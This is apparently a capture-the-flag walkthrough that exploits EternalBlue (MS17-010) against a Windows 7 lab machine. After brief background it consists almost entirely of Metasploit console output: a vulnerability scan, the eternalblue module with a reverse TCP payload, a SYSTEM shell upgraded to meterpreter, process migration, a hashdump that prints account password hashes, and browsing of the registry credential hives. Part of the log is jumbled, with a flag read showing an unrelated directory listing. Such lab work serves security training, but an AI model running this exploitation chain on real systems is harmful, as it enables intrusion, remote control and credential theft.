# Introduction to EternalBlue.

EternalBlue is a cyberattack exploit developed by the U.S. National Security Agency (NSA) that was leaked by the Shadow Brokers hacker group in April 2017. It exploits a vulnerability in Microsoft's implementation of the Server Message Block (SMB) protocol, specifically targeting Windows operating systems. The vulnerability, identified as CVE-2017-0144, allows attackers to execute arbitrary code on a target machine by sending specially crafted packets to the SMBv1 server.

EternalBlue gained widespread notoriety when it was used as part of the WannaCry ransomware attack in May 2017, which affected hundreds of thousands of computers worldwide, causing significant disruption to businesses and services. The exploit has also been used in other cyberattacks, including the NotPetya malware outbreak.

Microsoft released security patches to address the vulnerability in March 2017, prior to the public disclosure of EternalBlue. However, many systems remained unpatched at the time of the WannaCry attack, highlighting the importance of timely software updates and patch management in cybersecurity.

# Tutorial

``` bash
root@ip-10-10-22-151:~# nmap -sV -sC --script vuln -oN blue.nmap 10.10.26..121
```

This will scan the target for vulnerabilities and save the output to a file named blue.nmap.

``` bash
root@ip-10-10-22-151:~# msfconsole
msf6 > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see htt
                                             ps://docs.metasploit.com/do
                                             cs/using-metasploit/basics/
                                             using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows doma
                                             in to use for authenticatio
                                             n. Only affects Windows Ser
                                             ver 2008 R2, Windows 7, Win
                                             dows Embedded Standard 7 ta
                                             rget machines.
   SMBPass                         no        (Optional) The password for
                                              the specified username
   SMBUser                         no        (Optional) The username to
                                             authenticate as
   VERIFY_ARCH    true             yes       Check if remote architectur
                                             e matches exploit Target. O
                                             nly affects Windows Server
                                             2008 R2, Windows 7, Windows
                                              Embedded Standard 7 target
                                              machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches
                                             exploit Target. Only affect
                                             s Windows Server 2008 R2, W
                                             indows 7, Windows Embedded
                                             Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', se
                                        h, thread, process, none)
   LHOST     10.10.22.151     yes       The listen address (an interface
                                         may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > 

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.26.121
RHOSTS => 10.10.26.121
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.22.151:4444 
[*] 10.10.26.121:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.26.121:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.26.121:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.26.121:445 - The target is vulnerable.
[*] 10.10.26.121:445 - Connecting to target for exploitation.
[+] 10.10.26.121:445 - Connection established for exploitation.
[+] 10.10.26.121:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.26.121:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.26.121:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.26.121:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.26.121:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.26.121:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.26.121:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.26.121:445 - Sending all but last fragment of exploit packet
[*] 10.10.26.121:445 - Starting non-paged pool grooming
[+] 10.10.26.121:445 - Sending SMBv2 buffers
[+] 10.10.26.121:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.26.121:445 - Sending final SMBv2 buffers.
[*] 10.10.26.121:445 - Sending last fragment of exploit packet!
[*] 10.10.26.121:445 - Receiving response from exploit packet
[+] 10.10.26.121:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.26.121:445 - Sending egg to corrupted connection.
[*] 10.10.26.121:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.26.121
[*] Command shell session 1 opened (10.10.22.151:4444 -> 10.10.26.121:49177) at 2025-10-20 18:24:26 +0100
[+] 10.10.26.121:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.26.121:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.26.121:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>

C:\Windows\system32>^Z
Background session 1? [y/N]  y

msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter

msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to
                                        receive the connection
   LHOST                     no        IP of host that will receive the
                                       connection from the payload (Will
                                        try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1

msf6 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1

msf6 post(multi/manage/shell_to_meterpreter) > run
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.22.151:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (203846 bytes) to 10.10.26.121
[*] Meterpreter session 2 opened (10.10.22.151:4433 -> 10.10.26.121:49180) at 2025-10-20 18:30:38 +0100
[*] Stopping exploit/multi/handler

msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                Information          Connection
  --  ----  ----                -----------          ----------
  1         shell x64/windows   Shell Banner: Micro  10.10.22.151:4444 -
                                soft Windows [Versi  > 10.10.26.121:4917
                                on 6.1.7601] -----   7 (10.10.26.121)
  2         meterpreter x64/wi  NT AUTHORITY\SYSTEM  10.10.22.151:4433 -
            ndows                @ JON-PC            > 10.10.26.121:4918
                                                     0 (10.10.26.121)


msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > ps

Process List
============

 PID   PPID  Name        Arch  Session  User             Path
 ---   ----  ----        ----  -------  ----             ----
 0     0     [System Pr
             ocess]
 4     0     System      x64   0
 396   704   svchost.ex  x64   0        NT AUTHORITY\SY
             e                          STEM
 416   4     smss.exe    x64   0        NT AUTHORITY\SY  \SystemRoot\Sys
                                        STEM             tem32\smss.exe
 472   704   svchost.ex  x64   0        NT AUTHORITY\SY
             e                          STEM
 556   548   csrss.exe   x64   0        NT AUTHORITY\SY  C:\Windows\syst
                                        STEM             em32\csrss.exe
 604   548   wininit.ex  x64   0        NT AUTHORITY\SY  C:\Windows\syst
             e                          STEM             em32\wininit.ex
                                                         e
 616   596   csrss.exe   x64   1        NT AUTHORITY\SY  C:\Windows\syst
                                        STEM             em32\csrss.exe
 656   596   winlogon.e  x64   1        NT AUTHORITY\SY  C:\Windows\syst
             xe                         STEM             em32\winlogon.e
                                                         xe
 704   604   services.e  x64   0        NT AUTHORITY\SY  C:\Windows\syst
             xe                         STEM             em32\services.e
                                                         xe
 712   604   lsass.exe   x64   0        NT AUTHORITY\SY  C:\Windows\syst
                                        STEM             em32\lsass.exe
 720   604   lsm.exe     x64   0        NT AUTHORITY\SY  C:\Windows\syst
                                        STEM             em32\lsm.exe
 828   704   svchost.ex  x64   0        NT AUTHORITY\SY
             e                          STEM
 860   704   TrustedIns  x64   0        NT AUTHORITY\SY
             taller.exe                 STEM
 896   704   svchost.ex  x64   0        NT AUTHORITY\NE
             e                          TWORK SERVICE
 944   704   svchost.ex  x64   0        NT AUTHORITY\LO
             e                          CAL SERVICE
 1016  656   LogonUI.ex  x64   1        NT AUTHORITY\SY  C:\Windows\syst
             e                          STEM             em32\LogonUI.ex
                                                         e
 1064  704   svchost.ex  x64   0        NT AUTHORITY\LO
             e                          CAL SERVICE
 1140  828   WmiPrvSE.e
             xe
 1148  704   svchost.ex  x64   0        NT AUTHORITY\NE
             e                          TWORK SERVICE
 1296  704   spoolsv.ex  x64   0        NT AUTHORITY\SY  C:\Windows\Syst
             e                          STEM             em32\spoolsv.ex
                                                         e
 1332  704   svchost.ex  x64   0        NT AUTHORITY\LO
             e                          CAL SERVICE
 1396  704   amazon-ssm  x64   0        NT AUTHORITY\SY  C:\Program File
             -agent.exe                 STEM             s\Amazon\SSM\am
                                                         azon-ssm-agent.
                                                         exe
 1412  704   svchost.ex  x64   0        NT AUTHORITY\SY
             e                          STEM
 1472  704   LiteAgent.  x64   0        NT AUTHORITY\SY  C:\Program File
             exe                        STEM             s\Amazon\XenToo
                                                         ls\LiteAgent.ex
                                                         e
 1608  704   Ec2Config.  x64   0        NT AUTHORITY\SY  C:\Program File
             exe                        STEM             s\Amazon\Ec2Con
                                                         figService\Ec2C
                                                         onfig.exe
 1932  556   conhost.ex  x64   0        NT AUTHORITY\SY  C:\Windows\syst
             e                          STEM             em32\conhost.ex
                                                         e
 1948  704   svchost.ex  x64   0        NT AUTHORITY\NE
             e                          TWORK SERVICE
 2068  704   mscorsvw.e  x64   0        NT AUTHORITY\SY  C:\Windows\Micr
             xe                         STEM             osoft.NET\Frame
                                                         work64\v4.0.303
                                                         19\mscorsvw.exe
 2292  2928  powershell  x64   0        NT AUTHORITY\SY  C:\Windows\Syst
             .exe                       STEM             em32\WindowsPow
                                                         erShell\v1.0\po
                                                         wershell.exe
 2296  556   conhost.ex  x64   0        NT AUTHORITY\SY  C:\Windows\syst
             e                          STEM             em32\conhost.ex
                                                         e
 2532  704   svchost.ex  x64   0        NT AUTHORITY\LO
             e                          CAL SERVICE
 2552  704   sppsvc.exe  x64   0        NT AUTHORITY\NE
                                        TWORK SERVICE
 2560  556   conhost.ex  x64   0        NT AUTHORITY\SY  C:\Windows\syst
             e                          STEM             em32\conhost.ex
                                                         e
 2596  704   vds.exe     x64   0        NT AUTHORITY\SY
                                        STEM
 2680  1296  cmd.exe     x64   0        NT AUTHORITY\SY  C:\Windows\Syst
                                        STEM             em32\cmd.exe
 2744  704   SearchInde  x64   0        NT AUTHORITY\SY
             xer.exe                    STEM
 3052  2068  mscorsvw.e  x64   0        NT AUTHORITY\SY  C:\Windows\Micr
             xe                         STEM             osoft.NET\Frame
                                                         work64\v4.0.303
                                                         19\mscorsvw.exe
 3064  1608  powershell  x64   0        NT AUTHORITY\SY  C:\Windows\syst
             .exe                       STEM             em32\WindowsPow
                                                         erShell\v1.0\po
                                                         wershell.exe

meterpreter > migrate 1296  #spoolsv.exe
[*] Migrating from 2292 to 1296...
[*] Migration completed successfully.   

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

meterpreter > pwd
C:\Windows\system32
meterpreter > cd ..
meterpreter > cd ..
pmeterpreter > pwd
C:\
meterpreter > ls
Listing: C:\
============

Mode          Size   Type  Last modified          Name
----          ----   ----  -------------          ----
040777/rwxrw  0      dir   2018-12-13 03:13:36 +  $Recycle.Bin
xrwx                       0000
040777/rwxrw  0      dir   2009-07-14 06:08:56 +  Documents and Settings
xrwx                       0100
040777/rwxrw  0      dir   2009-07-14 04:20:08 +  PerfLogs
xrwx                       0100
040555/r-xr-  4096   dir   2019-03-17 22:22:01 +  Program Files
xr-x                       0000
040555/r-xr-  4096   dir   2019-03-17 22:28:38 +  Program Files (x86)
xr-x                       0000
040777/rwxrw  4096   dir   2019-03-17 22:35:57 +  ProgramData
xrwx                       0000
040777/rwxrw  0      dir   2018-12-13 03:13:22 +  Recovery
xrwx                       0000
040777/rwxrw  4096   dir   2025-10-20 18:48:43 +  System Volume Informat
xrwx                       0100                   ion
040555/r-xr-  4096   dir   2018-12-13 03:13:28 +  Users
xr-x                       0000
040777/rwxrw  16384  dir   2019-03-17 22:36:30 +  Windows
xrwx                       0000
040777/rwxrw  0      dir   2025-10-20 18:12:39 +  badr
xrwx                       0100
100666/rw-rw  24     fil   2019-03-17 19:27:21 +  flag1.txt
-rw-                       0000
000000/-----  0      fif   1970-01-01 01:00:00 +  hiberfil.sys
----                       0100
000000/-----  0      fif   1970-01-01 01:00:00 +  pagefile.sys
----                       0100

meterpreter > cat flag1.txt

                                                    egtrans-ms
100666/rw-rw  12582912  fil   2025-10-20 18:49:55   SYSTEM
-rw-                          +0100
100666/rw-rw  1024      fil   2011-04-12 09:32:06   SYSTEM.LOG
-rw-                          +0100
100666/rw-rw  262144    fil   2025-10-20 18:49:55   SYSTEM.LOG1
-rw-                          +0100
100666/rw-rw  0         fil   2009-07-14 03:34:08   SYSTEM.LOG2
-rw-                          +0100
100666/rw-rw  65536     fil   2019-03-17 22:21:22   SYSTEM{016888cd-6c6f
-rw-                          +0000                 -11de-8d1d-001e0bcde
                                                    3ec}.TM.blf
100666/rw-rw  524288    fil   2019-03-17 22:21:22   SYSTEM{016888cd-6c6f
-rw-                          +0000                 -11de-8d1d-001e0bcde
                                                    3ec}.TMContainer0000
                                                    0000000000000001.reg
                                                    trans-ms
100666/rw-rw  524288    fil   2019-03-17 22:21:22   SYSTEM{016888cd-6c6f
-rw-                          +0000                 -11de-8d1d-001e0bcde
                                                    3ec}.TMContainer0000
                                                    0000000000000002.reg
                                                    trans-ms
040777/rwxrw  4096      dir   2018-12-12 23:03:05   TxR
xrwx                          +0000
100666/rw-rw  34        fil   2019-03-17 19:32:48   flag2.txt
-rw-                          +0000
040777/rwxrw  4096      dir   2010-11-21 02:41:37   systemprofile
xrwx                          +0000

meterpreter > ls
Listing: C:\windows\system32\config
===================================

Mode          Size      Type  Last modified         Name
----          ----      ----  -------------         ----
100666/rw-rw  28672     fil   2018-12-12 23:00:40   BCD-Template
-rw-                          +0000
100666/rw-rw  25600     fil   2018-12-12 23:00:40   BCD-Template.LOG
-rw-                          +0000
100666/rw-rw  18087936  fil   2025-10-20 18:22:27   COMPONENTS
-rw-                          +0100
100666/rw-rw  1024      fil   2011-04-12 09:32:10   COMPONENTS.LOG
-rw-                          +0100
100666/rw-rw  13312     fil   2025-10-20 18:22:27   COMPONENTS.LOG1
-rw-                          +0100
100666/rw-rw  0         fil   2009-07-14 03:34:08   COMPONENTS.LOG2
-rw-                          +0100
100666/rw-rw  1048576   fil   2025-10-20 18:12:39   COMPONENTS{016888b8-
-rw-                          +0100                 6c6f-11de-8d1d-001e0
                                                    bcde3ec}.TxR.0.regtr
                                                    ans-ms
100666/rw-rw  1048576   fil   2025-10-20 18:12:39   COMPONENTS{016888b8-
-rw-                          +0100                 6c6f-11de-8d1d-001e0
                                                    bcde3ec}.TxR.1.regtr
                                                    ans-ms
100666/rw-rw  1048576   fil   2025-10-20 18:12:39   COMPONENTS{016888b8-
-rw-                          +0100                 6c6f-11de-8d1d-001e0
                                                    bcde3ec}.TxR.2.regtr
                                                    ans-ms
100666/rw-rw  65536     fil   2025-10-20 18:12:39   COMPONENTS{016888b8-
-rw-                          +0100                 6c6f-11de-8d1d-001e0
                                                    bcde3ec}.TxR.blf
100666/rw-rw  65536     fil   2018-12-13 03:20:57   COMPONENTS{016888b9-
-rw-                          +0000                 6c6f-11de-8d1d-001e0
                                                    bcde3ec}.TM.blf
100666/rw-rw  524288    fil   2018-12-13 03:20:57   COMPONENTS{016888b9-
-rw-                          +0000                 6c6f-11de-8d1d-001e0
                                                    bcde3ec}.TMContainer
                                                    00000000000000000001
                                                    .regtrans-ms
100666/rw-rw  524288    fil   2009-07-14 06:01:27   COMPONENTS{016888b9-
-rw-                          +0100                 6c6f-11de-8d1d-001e0
                                                    bcde3ec}.TMContainer
                                                    00000000000000000002
                                                    .regtrans-ms
100666/rw-rw  262144    fil   2025-10-20 18:45:47   DEFAULT
-rw-                          +0100
100666/rw-rw  1024      fil   2011-04-12 09:32:10   DEFAULT.LOG
-rw-                          +0100
100666/rw-rw  177152    fil   2025-10-20 18:45:47   DEFAULT.LOG1
-rw-                          +0100
100666/rw-rw  0         fil   2009-07-14 03:34:08   DEFAULT.LOG2
-rw-                          +0100
100666/rw-rw  65536     fil   2019-03-17 22:22:17   DEFAULT{016888b5-6c6
-rw-                          +0000                 f-11de-8d1d-001e0bcd
                                                    e3ec}.TM.blf
100666/rw-rw  524288    fil   2019-03-17 22:22:17   DEFAULT{016888b5-6c6
-rw-                          +0000                 f-11de-8d1d-001e0bcd
                                                    e3ec}.TMContainer000
                                                    00000000000000001.re
                                                    gtrans-ms
100666/rw-rw  524288    fil   2019-03-17 22:22:17   DEFAULT{016888b5-6c6
-rw-                          +0000                 f-11de-8d1d-001e0bcd
                                                    e3ec}.TMContainer000
                                                    00000000000000002.re
                                                    gtrans-ms
040777/rwxrw  0         dir   2009-07-14 03:34:57   Journal
xrwx                          +0100
040777/rwxrw  4096      dir   2025-10-20 18:41:51   RegBack
xrwx                          +0100
100666/rw-rw  262144    fil   2019-03-17 20:05:08   SAM
-rw-                          +0000
100666/rw-rw  1024      fil   2011-04-12 09:32:10   SAM.LOG
-rw-                          +0100
100666/rw-rw  21504     fil   2019-03-17 22:39:12   SAM.LOG1
-rw-                          +0000
100666/rw-rw  0         fil   2009-07-14 03:34:08   SAM.LOG2
-rw-                          +0100
100666/rw-rw  65536     fil   2019-03-17 22:22:17   SAM{016888c1-6c6f-11
-rw-                          +0000                 de-8d1d-001e0bcde3ec
                                                    }.TM.blf
100666/rw-rw  524288    fil   2019-03-17 22:22:17   SAM{016888c1-6c6f-11
-rw-                          +0000                 de-8d1d-001e0bcde3ec
                                                    }.TMContainer0000000
                                                    0000000000001.regtra
                                                    ns-ms
100666/rw-rw  524288    fil   2019-03-17 22:22:17   SAM{016888c1-6c6f-11
-rw-                          +0000                 de-8d1d-001e0bcde3ec
                                                    }.TMContainer0000000
                                                    0000000000002.regtra
                                                    ns-ms
100666/rw-rw  262144    fil   2025-10-20 18:22:37   SECURITY
-rw-                          +0100
100666/rw-rw  1024      fil   2011-04-12 09:32:10   SECURITY.LOG
-rw-                          +0100
100666/rw-rw  21504     fil   2025-10-20 18:22:37   SECURITY.LOG1
-rw-                          +0100
100666/rw-rw  0         fil   2009-07-14 03:34:08   SECURITY.LOG2
-rw-                          +0100
100666/rw-rw  65536     fil   2019-03-17 22:22:17   SECURITY{016888c5-6c
-rw-                          +0000                 6f-11de-8d1d-001e0bc
                                                    de3ec}.TM.blf
100666/rw-rw  524288    fil   2019-03-17 22:22:17   SECURITY{016888c5-6c
-rw-                          +0000                 6f-11de-8d1d-001e0bc
                                                    de3ec}.TMContainer00
                                                    000000000000000001.r
                                                    egtrans-ms
100666/rw-rw  524288    fil   2019-03-17 22:22:17   SECURITY{016888c5-6c
-rw-                          +0000                 6f-11de-8d1d-001e0bc
                                                    de3ec}.TMContainer00
                                                    000000000000000002.r
                                                    egtrans-ms
100666/rw-rw  40632320  fil   2025-10-20 18:48:55   SOFTWARE
-rw-                          +0100
100666/rw-rw  1024      fil   2011-04-12 09:32:10   SOFTWARE.LOG
-rw-                          +0100
100666/rw-rw  262144    fil   2025-10-20 18:48:55   SOFTWARE.LOG1
-rw-                          +0100
100666/rw-rw  0         fil   2009-07-14 03:34:08   SOFTWARE.LOG2
-rw-                          +0100
100666/rw-rw  65536     fil   2019-03-17 22:21:19   SOFTWARE{016888c9-6c
-rw-                          +0000                 6f-11de-8d1d-001e0bc
                                                    de3ec}.TM.blf
100666/rw-rw  524288    fil   2019-03-17 22:21:19   SOFTWARE{016888c9-6c
-rw-                          +0000                 6f-11de-8d1d-001e0bc
                                                    de3ec}.TMContainer00
                                                    000000000000000001.r
                                                    egtrans-ms
100666/rw-rw  524288    fil   2019-03-17 22:21:19   SOFTWARE{016888c9-6c
-rw-                          +0000                 6f-11de-8d1d-001e0bc
                                                    de3ec}.TMContainer00
                                                    000000000000000002.r
                                                    egtrans-ms
100666/rw-rw  12582912  fil   2025-10-20 18:49:55   SYSTEM
-rw-                          +0100
100666/rw-rw  1024      fil   2011-04-12 09:32:06   SYSTEM.LOG
-rw-                          +0100
100666/rw-rw  262144    fil   2025-10-20 18:49:55   SYSTEM.LOG1
-rw-                          +0100
100666/rw-rw  0         fil   2009-07-14 03:34:08   SYSTEM.LOG2
-rw-                          +0100
100666/rw-rw  65536     fil   2019-03-17 22:21:22   SYSTEM{016888cd-6c6f
-rw-                          +0000                 -11de-8d1d-001e0bcde
                                                    3ec}.TM.blf
100666/rw-rw  524288    fil   2019-03-17 22:21:22   SYSTEM{016888cd-6c6f
-rw-                          +0000                 -11de-8d1d-001e0bcde
                                                    3ec}.TMContainer0000
                                                    0000000000000001.reg
                                                    trans-ms
100666/rw-rw  524288    fil   2019-03-17 22:21:22   SYSTEM{016888cd-6c6f
-rw-                          +0000                 -11de-8d1d-001e0bcde
                                                    3ec}.TMContainer0000
                                                    0000000000000002.reg
                                                    trans-ms
040777/rwxrw  4096      dir   2018-12-12 23:03:05   TxR
xrwx                          +0000
100666/rw-rw  34        fil   2019-03-17 19:32:48   flag2.txt
-rw-                          +0000
040777/rwxrw  4096      dir   2010-11-21 02:41:37   systemprofile
xrwx                          +0000

meterpreter > pwd
C:\windows\system32\config
meterpreter > cd ..
meterpreter > cd ..
dmeterpreter > ls
Listing: C:\windows
===================

Mode          Size     Type  Last modified         Name
----          ----     ----  -------------         ----
040777/rwxrw  0        dir   2009-07-14 04:20:08   AppCompat
xrwx                         +0100
040777/rwxrw  4096     dir   2010-11-21 03:29:44   AppPatch
xrwx                         +0000
040777/rwxrw  0        dir   2009-07-14 06:32:38   Boot
xrwx                         +0100
040777/rwxrw  0        dir   2009-07-14 06:32:38   Branding
xrwx                         +0100
040777/rwxrw  0        dir   2018-12-12 23:01:32   CSC
xrwx                         +0000
040777/rwxrw  40960    dir   2009-07-14 06:32:39   Cursors
xrwx                         +0100
040777/rwxrw  0        dir   2009-07-14 06:37:46   DigitalLocker
xrwx                         +0100
040777/rwxrw  0        dir   2009-07-14 06:32:39   Downloaded Program Fi
xrwx                         +0100                 les
100666/rw-rw  2790     fil   2018-12-12 23:02:52   DtcInstall.log
-rw-                         +0000
040555/r-xr-  98304    dir   2010-11-21 03:29:46   Fonts
xr-x                         +0000
040777/rwxrw  0        dir   2011-04-12 09:30:42   Globalization
xrwx                         +0100
040777/rwxrw  0        dir   2011-04-12 09:17:51   Help
xrwx                         +0100
100777/rwxrw  733696   fil   2009-07-14 02:39:12   HelpPane.exe
xrwx                         +0100
040777/rwxrw  0        dir   2009-07-14 06:37:46   IME
xrwx                         +0100
040777/rwxrw  4096     dir   2019-03-17 22:36:17   Installer
xrwx                         +0000
040777/rwxrw  0        dir   2009-07-14 06:32:39   L2Schemas
xrwx                         +0100
040777/rwxrw  0        dir   2009-07-14 03:34:24   LiveKernelReports
xrwx                         +0100
040777/rwxrw  0        dir   2025-10-20 18:48:39   Logs
xrwx                         +0100
040555/r-xr-  12288    dir   2009-07-14 06:32:40   Media
xr-x                         +0100
040777/rwxrw  8192     dir   2025-10-20 18:39:48   Microsoft.NET
xrwx                         +0100
040777/rwxrw  0        dir   2019-03-17 22:28:36   Migration
xrwx                         +0000
040777/rwxrw  0        dir   2009-07-14 03:34:34   ModemLogs
xrwx                         +0100
040777/rwxrw  0        dir   2009-07-14 06:32:40   Offline Web Pages
xrwx                         +0100
100666/rw-rw  4568     fil   2010-11-21 03:47:07   PFRO.log
-rw-                         +0000
040777/rwxrw  0        dir   2009-07-14 04:20:10   PLA
xrwx                         +0100
100777/rwxrw  87616    fil   2019-03-17 22:36:30   PSSDNSVC.EXE
xrwx                         +0000
040777/rwxrw  4096     dir   2018-12-13 03:13:23   Panther
xrwx                         +0000
040777/rwxrw  0        dir   2009-07-14 06:32:38   Performance
xrwx                         +0100
040777/rwxrw  40960    dir   2011-04-12 09:28:20   PolicyDefinitions
xrwx                         +0100
040777/rwxrw  40960    dir   2025-10-20 18:42:53   Prefetch
xrwx                         +0100
100666/rw-rw  53551    fil   2009-06-10 21:30:55   Professional.xml
-rw-                         +0100
040777/rwxrw  0        dir   2009-07-14 04:20:11   Registration
xrwx                         +0100
040777/rwxrw  0        dir   2009-07-14 06:32:38   Resources
xrwx                         +0100
040777/rwxrw  0        dir   2009-07-14 03:35:47   SchCache
xrwx                         +0100
040777/rwxrw  0        dir   2009-07-14 05:45:47   ServiceProfiles
xrwx                         +0100
040777/rwxrw  0        dir   2019-03-17 22:35:44   Setup
xrwx                         +0000
040777/rwxrw  0        dir   2011-04-12 09:28:28   ShellNew
xrwx                         +0100
040777/rwxrw  4096     dir   2018-12-13 03:14:25   SoftwareDistribution
xrwx                         +0000
040777/rwxrw  0        dir   2011-04-12 09:17:51   Speech
xrwx                         +0100
100666/rw-rw  48201    fil   2009-06-10 21:31:02   Starter.xml
-rw-                         +0100
040777/rwxrw  524288   dir   2019-03-17 22:30:22   SysWOW64
xrwx                         +0000
040777/rwxrw  655360   dir   2025-10-20 18:16:55   System32
xrwx                         +0100
040777/rwxrw  0        dir   2009-07-14 05:57:13   TAPI
xrwx                         +0100
100666/rw-rw  1355     fil   2018-12-12 23:02:50   TSSysprep.log
-rw-                         +0000
040777/rwxrw  0        dir   2009-07-14 06:08:49   Tasks
xrwx                         +0100
040777/rwxrw  12288    dir   2025-10-20 18:49:01   Temp
xrwx                         +0100
040777/rwxrw  0        dir   2009-07-14 04:20:14   Vss
xrwx                         +0100
100666/rw-rw  316640   fil   2009-06-10 21:52:44   WMSysPr9.prx
-rw-                         +0100
040777/rwxrw  0        dir   2009-07-14 06:32:38   Web
xrwx                         +0100
100444/r--r-  749      fil   2009-07-14 05:54:24   WindowsShell.Manifest
-r--                         +0100
100666/rw-rw  6653     fil   2019-03-17 22:36:17   WindowsUpdate.log
-rw-                         +0000
040777/rwxrw  0        dir   2009-07-14 06:32:39   addins
xrwx                         +0100
040555/r-xr-  4096     dir   2019-03-17 22:31:23   assembly
xr-x                         +0000
100777/rwxrw  71168    fil   2010-11-21 03:24:22   bfsvc.exe
xrwx                         +0000
100666/rw-rw  67584    fil   2025-10-20 18:11:53   bootstat.dat
-rw-                         +0100
